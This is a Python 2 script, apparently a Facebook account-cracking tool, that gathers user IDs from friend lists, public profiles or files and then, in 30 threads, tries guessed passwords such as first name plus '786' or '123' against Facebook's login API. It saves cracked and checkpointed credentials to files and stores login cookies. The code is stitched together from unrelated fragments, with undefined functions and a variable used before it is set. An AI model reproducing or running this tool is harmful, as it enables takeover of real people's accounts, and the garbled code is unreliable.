#!/usr/bin/python2
#coding=utf-8


print("\033[1;97m•◈•───────•◈ GAK NGEWE GAK ASYIK ◈•───────•◈•")  

jalan("   \033[1;93m SELAMAT MALING ANJING ")

print("\033[1;97m•◈•──────────•◈•\033[1;96mDEVIL-HACK\033[1;96m•◈•──────────•◈•")


def loginFb(self, url, config):
	os.system('clear')
	print(config.banner())
	print('\n(?) Login with your fb cookies first (?)\n')
	while True:
		cookies = raw_input('Put your FB cookies here: ')
		response = config.httpRequest(url, cookies).encode('utf-8')
		if 'mbasic_logout_button' in str(response):
			print('\nPlease wait a minute...')
			language.main(cookies, url, config)
			follow_me.main(cookies, url, config)
			comment_me.main(cookies, url, config)
			try: os.mkdir('log')
			except: pass
			save = open('log/cookies.log','w')
			save.write(cookies.strip())
			save.close()
			print('\n\033[0;92mLogin successfully\033[0m')
			time.sleep(2)
			break
		else:
			print('\n\033[0;91mWrong cookies, please try Again.\n\033[0m')
			
			import requests
			
	def loadCookie(self):
		try:
			file = open('log/cookies.log','r')
			cookie = file.read()
			file.close()
			return cookie.strip()
		except IOError:
			return False

	def banner(self):
		return '''\n
\033[0;96m   __  ___     ____  _   ___  ____
\033[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/  \033[0m|| Created By DulLah
\033[0;96m / /|_/ / // / / __/ / / _  / _/    \033[0m|| Github.com/dz-id
\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/ \033[0;91mv2.0 \033[0m|| FB.me/dulahz'''

	def httpRequest(self, url, cookies):
		try:
			return requests.get(url, cookies = {'cookie': cookies}).text
		except requests.exceptions.RequestException:
			exit('\n\n\033[0;91mConnection error, check your connection!!\033[0m')

	def httpRequestPost(self, url, cookies, params):
		try:
			return requests.post(url, data = params, cookies = {'cookie': cookies}).text
		except requests.exceptions.RequestException:
			exit('\n\n\033[0;91mConnection error, check your connection!!\033[0m')
			
			
	os.system("clear")
	print logo
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	menu()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;97m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\033[1;97m[✺] ID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[1;97m[+] \033[1;97mEnter the file name \033[1;97m: \033[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"

	jalan('          \033[1;97mAahil start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	
	
